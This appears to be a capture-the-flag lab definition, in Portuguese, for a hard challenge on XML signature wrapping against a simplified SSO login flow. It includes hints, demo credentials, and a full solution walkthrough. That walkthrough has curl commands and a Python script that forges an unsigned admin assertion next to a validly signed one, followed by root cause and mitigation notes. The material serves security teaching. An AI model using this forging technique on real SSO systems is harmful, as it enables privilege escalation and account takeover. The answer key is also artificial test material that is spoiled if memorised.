@@ -1,0 +1,83 @@
+{
+  "slug": "auth-sso-assertion-replay",
+  "title": "Asserção assinada, agora de outra pessoa",
+  "codename": "HELIOS",
+  "summary": "O ACS do Helios verifica o digest HMAC da asserção indicada pela referência da assinatura e depois monta a sessão a partir da primeira <Assertion> que encontra no envelope. Envolva a asserção assinada em uma não assinada com role=admin.",
+  "category": "auth",
+  "difficulty": "hard",
+  "kind": "challenge",
+  "lab_dir": "auth-sso-assertion-replay",
+  "estimated_minutes": 35,
+  "xp": 190,
+  "tech": [
+    "Flask",
+    "XML",
+    "HMAC-SHA256",
+    "Base64",
+    "SSO"
+  ],
+  "tags": [
+    "xml-signature-wrapping",
+    "saml",
+    "sso",
+    "privilege-escalation"
+  ],
+  "story": "O Helios Support federa o login com provedores de identidade parceiros. Para manter o lab sem dependências, o gateway usa um pequeno perfil XML em vez de SAML completo: um envelope <Response> carrega uma <Signature> cujo <SignedInfo><Reference URI=\"#assertion-id\"> nomeia uma asserção, e <DigestValue> é um HMAC-SHA256 sobre os bytes canônicos dessa asserção. A checagem de assinatura é real — mas a sessão é montada a partir de um elemento diferente do que foi verificado. O IdP de demonstração emite uma resposta assinada legítima por sessão de navegador.",
+  "objective": "Envie uma resposta cuja assinatura ainda valide enquanto o gateway lê atributos de identidade de admin de uma asserção não assinada, e então chegue ao console do parceiro para obter a flag.",
+  "rules": "Fique na origem loopback atribuída. Não ataque as credenciais do IdP de demonstração. As flags são dinâmicas.",
+  "flags": [
+    {
+      "key": "flag",
+      "label": "Segredo do console do parceiro",
+      "flag_type": "user",
+      "points": 190,
+      "required": true,
+      "requires_objective": true
+    }
+  ],
+  "hints": [
+    {
+      "level": 1,
+      "title": "Leia uma resposta íntegra",
+      "body": "Faça login em `/idp/login` como `renner` / `renner-demo-2026` e poste o valor base64 em `/sso/acs`. Você cai em `/portal` com role `user`. Compare o XML: a `<Signature>` aponta para uma `<Assertion ID=...>` específica.",
+      "cost": 20
+    },
+    {
+      "level": 2,
+      "title": "Em quem se confia?",
+      "body": "O validador resolve `Reference URI` e confere o HMAC exatamente daquela asserção. O construtor de sessão, por sua vez, escolhe o primeiro elemento `<Assertion>` do documento. Nada amarra essas duas escolhas, e o ACS aceita o base64 na query ou no body (`request.values`).",
+      "cost": 30
+    },
+    {
+      "level": 3,
+      "title": "Envolva",
+      "body": "Monte um Response com a asserção assinada e sua assinatura ainda presentes, mais uma segunda falsificação colocada antes dela. A falsificação não precisa carregar `role=admin` em um nó assinado. Mantenha a asserção assinada intacta byte a byte: a forma canônica descarta a indentação, mas preserva o conteúdo. Poste o novo base64 e abra `/portal` com o cookie emitido.",
+      "cost": 40
+    }
+  ],
+  "solution": {
+    "walkthrough": "1. Obtenha uma resposta legitimamente assinada:\n\n```bash\ncurl -s -d 'username=renner&password=renner-demo-2026' http://127.0.0.1:PORT/idp/login \\\n  | sed -n 's|.*<pre>\\([A-Za-z0-9+/=]*\\)</pre>.*|\\1|p' | tail -1 > resp.b64\ncurl -i -d \"SAMLResponse=$(cat resp.b64)\" http://127.0.0.1:PORT/sso/acs   # 302 /portal, cookie helios_session\n```\n\nDecodifique para inspecionar a estrutura:\n\n```bash\nbase64 -d resp.b64\n# <Response ...><Issuer>..</Issuer><Destination>..</Destination>\n#   <Signature><SignedInfo><Reference URI=\"#_abcd\"><DigestValue>..</DigestValue>...</Signature>\n#   <ns0:Assertion xmlns:ns0=\"urn:helios:crm:assertion:1.0\" ID=\"_abcd\">..role=user..\n```\n\n2. Monte um payload de wrapping: uma asserção forjada primeiro, depois a assinatura intocada e a asserção assinada intocada. Qualquer XML estruturalmente válido, com os mesmos bytes da asserção assinada, funciona:\n\n```bash\npython3 - <<'PY'\nimport base64, re\nxml = base64.b64decode(open('resp.b64','rb').read()).decode()\nsigned = re.search(r'<(?:\\w+:)?Assertion\\b.*?</(?:\\w+:)?Assertion>', xml, re.S).group(0)\nsig = re.search(r'<Signature>.*?</Signature>', xml, re.S).group(0)\nevil = ('<Assertion xmlns=\"urn:helios:crm:assertion:1.0\" ID=\"_evil\">'\n        '<Subject><NameID>renner@helios.local#2026</NameID></Subject>'\n        '<Attribute name=\"email\"><Value>renner@helios.local</Value></Attribute>'\n        '<Attribute name=\"role\"><Value>admin</Value></Attribute>'\n        '<Attribute name=\"username\"><Value>renner</Value></Attribute></Assertion>')\nwrapped = ('<Response xmlns=\"urn:helios:crm:assertion:1.0\" ID=\"_wrapped\">'\n           '<Issuer>https://idp.helios.local/sso</Issuer>' + evil + sig + signed + '</Response>')\nopen('evil.b64','w').write(base64.b64encode(wrapped.encode()).decode())\nPY\ncurl -i -d \"SAMLResponse=$(cat evil.b64)\" http://127.0.0.1:PORT/sso/acs   # 302 /portal\n```\n\n3. Siga o redirect com o cookie `helios_session`:\n\n```bash\ncurl -b 'helios_session=<SESSION>' http://127.0.0.1:PORT/portal\n```\n\nO portal reporta role `admin` e imprime a flag. A variante `XSW` é igualmente válida: duplique a asserção assinada dentro de um elemento `<Extensions>` para que os bytes originais permaneçam no documento enquanto a primeira asserção é a forjada.",
+    "root_cause": "XML Signature Wrapping (XSW). `verify_envelope_signature()` resolve o `Reference URI`, encontra a `Assertion` correspondente e verifica o HMAC sobre ela — mas o ACS depois seleciona `descendants(root, 'Assertion')[0]` para obter os atributos de identidade. O verificador e o consumidor olham para nós diferentes, então um atacante pode adicionar uma `<Assertion>` não assinada feita por ele mesmo, que o verificador nunca inspeciona, mantendo no lugar o original assinado. O perfil HMAC do lab reproduz o mesmo erro de trust boundary de SPs SAML reais que validam uma assinatura e depois leem atributos por meio de uma consulta XPath separada.",
+    "mitigation": "Consuma exatamente o nó XML que foi validado: retorne o elemento verificado pela checagem de assinatura e leia atributos apenas dele, ou compare a serialização canônica do nó consumido com os bytes assinados. Rejeite documentos com mais de uma `<Assertion>` (ou `<Signature>`), aplique um schema estrito, exija que o `Reference URI` aponte para a única asserção e fixe `Destination`/audience. Use uma biblioteca de segurança XML auditada (por exemplo, `pysaml2`, `python3-saml` com `xmlsec1`) e mantenha-a corrigida contra bypasses no estilo CVE-2018-0487."
+  },
+  "references": [
+    {
+      "title": "PortSwigger — SAML-based authentication vulnerabilities (XSW)",
+      "url": "https://portswigger.net/web-security/authentication/saml/exploiting",
+      "source_type": "official",
+      "description": "Payloads de signature wrapping e como relying parties são induzidas a ler asserções não assinadas."
+    },
+    {
+      "title": "HackTricks — SAML signature wrapping attack",
+      "url": "https://book.hacktricks.wiki/en/pentesting-web/saml-attacks/saml-basics.html",
+      "source_type": "research",
+      "description": "Construção prática de XSW e taxonomia de ataques SAML."
+    },
+    {
+      "title": "OWASP SAML Security Cheat Sheet",
+      "url": "https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html",
+      "source_type": "standard",
+      "description": "Endurecimento do assertion consumer service: validação de schema, asserção única e consumo do nó verificado."
+    }
+  ]
+}
